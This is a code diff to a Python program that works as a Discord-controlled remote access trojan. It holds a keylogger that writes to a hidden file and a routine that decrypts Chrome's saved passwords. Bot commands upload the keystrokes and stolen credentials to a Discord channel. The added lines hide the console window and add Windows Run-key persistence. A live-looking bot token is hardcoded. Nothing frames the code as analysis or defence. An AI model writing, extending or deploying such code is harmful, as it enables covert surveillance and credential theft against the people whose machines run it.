@@ -13,15 +13,21 @@ from Crypto.Cipher import AES
 import shutil
 import ctypes
 from datetime import timezone, datetime, timedelta
+import winreg as reg
+import sys
+
+if sys.platform == "win32":
+    # Hide the console window
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def on_key_event(e):
-    with open("c:/Program Files/default.ini", "a") as file:
+    with open("d:/default.txt", "a") as file:
         if e.name in ['shift', 'ctrl', 'alt', 'esc', 'enter', 'backspace']:
-            file.write(f" {e.name}")
+            file.write(f" {e.name} ")
         else:
-            file.write(f" {e.name}")
+            file.write(f"{e.name}")
     FILE_ATTRIBUTE_HIDDEN = 0x02
-    ctypes.windll.kernel32.SetFileAttributesW("c:/Program Files/default.ini", FILE_ATTRIBUTE_HIDDEN)
+    ctypes.windll.kernel32.SetFileAttributesW("d:/default.txt", FILE_ATTRIBUTE_HIDDEN)
 
 intents = discord.Intents.default()
 intents.message_content = True  # Enables bot to read message content
@@ -38,7 +44,7 @@ def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
-    local_state_path = os.path.join("C:/Users/Administrator",
+    local_state_path = os.path.join("d:/Administrator",
                                     "AppData", "Local", "Google", "Chrome",
                                     "User Data", "Local State")
     with open(local_state_path, "r", encoding="utf-8") as f:
@@ -74,7 +80,7 @@ def get_password(user, profile):
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
-    db_path = os.path.join(f"C:/Users/{user}", "AppData", "Local",
+    db_path = os.path.join(f"d:/{user}", "AppData", "Local",
                             "Google", "Chrome", "User Data", profile, "Login Data")
     result = ""
     # copy the file to another location
@@ -118,8 +124,36 @@ def get_password(user, profile):
             pass
         with open("gmail.txt", "a") as file:
             file.write(result)
+        return 1
     except FileNotFoundError:
-        print("file doesn't exist")
+        return 0
+    
+    
+def add_to_startup(app_name="main"):
+    """Add the application to the Windows startup registry."""
+    # If no file path is provided, use the path of the current 
+    
+    script_location = os.path.abspath(__file__)
+    script_directory = os.path.dirname(script_location)
+    
+    # if file_path is None:
+    #     file_path = os.path.abspath(sys.argv[0])
+    
+    # Registry key where startup programs are listed
+    key = reg.HKEY_CURRENT_USER
+    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    
+    # Open the registry key with write access
+    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+    
+    # Set the value in the registry to the path of the Python script
+    reg.SetValueEx(open_key, app_name, 0, reg.REG_SZ, script_directory)
+    
+    # Close the registry key
+    reg.CloseKey(open_key)
+
+add_to_startup()
+    
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user}')
@@ -157,11 +191,9 @@ async def key(ctx):
     channel = ctx.channel
     if mac != channel.name:
         return
-    with open("c:/Program Files/default.ini", "rb") as f:
+    with open("d:/default.txt", "rb") as f:
         await ctx.send("Here is key events:", file=discord.File(f))
-    with open('c:/Program Files/default.ini', 'w') as file:
-        # No need to write anything, opening in 'w' mode clears the file
-        pass
+    os.remove('d:/default.txt')
     
 @bot.command()
 async def clipboard(ctx):
@@ -233,14 +265,17 @@ async def gmail(ctx, *, param: str):
     channel = ctx.channel
     if mac != channel.name:
         return
-    get_password(user, profile)
-    with open("gmail.txt", "rb") as f:
-        await ctx.send("Here is gmail infos:", file=discord.File(f))
-    with open('gmail.txt', 'w') as file:
-        # No need to write anything, opening in 'w' mode clears the file
-        pass
+    result = get_password(user, profile)
+    if result == 1:
+        with open("gmail.txt", "rb") as f:
+            await ctx.send("Here is gmail infos:", file=discord.File(f))
+        with open('gmail.txt', 'w') as file:
+            # No need to write anything, opening in 'w' mode clears the file
+            pass
+    else:
+        await ctx.send(f"File path isn't correct!")
         
 
 keyboard.on_press(on_key_event)    
     
-bot.run('MTI3NjIwODYwOTQwNzAxMjk1NQ.GL50-m.3nLBbHr39A1xoLpRtJMAOwBM8Jz2oW8Dv_HCMU')
+bot.run('MTI3NjIwODYwOTQwNzAxMjk1NQ.GL50-m.3nLBbHr39A1xoLpRtJMAOwBM8Jz2oW8Dv_HCMU') 
